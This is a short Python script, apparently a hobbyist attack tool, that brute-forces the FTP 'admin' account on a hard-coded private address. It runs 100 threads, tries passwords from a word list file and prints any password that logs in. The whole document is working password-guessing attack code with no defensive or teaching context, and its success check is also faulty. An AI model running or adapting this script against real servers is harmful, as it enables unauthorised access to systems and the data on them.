from ftplib import FTP
import ftplib
from  threading import Thread


# addr = input('address=')


def find(f, addr):
    for i in f:
        try:
            ftp = FTP(addr)
            print(i.strip("\r\n") + " is testing")
            ftp.login("admin", i.strip("\r\n"))
            if ftp.connect():
                print("password=" + i)
                break
        except ftplib.all_errors:
            print("xata")


addr = '192.168.20.200'
f = open('log.txt')

for i in range(0, 100):
    t = Thread(target=find, args=(f, addr))
    t.start()
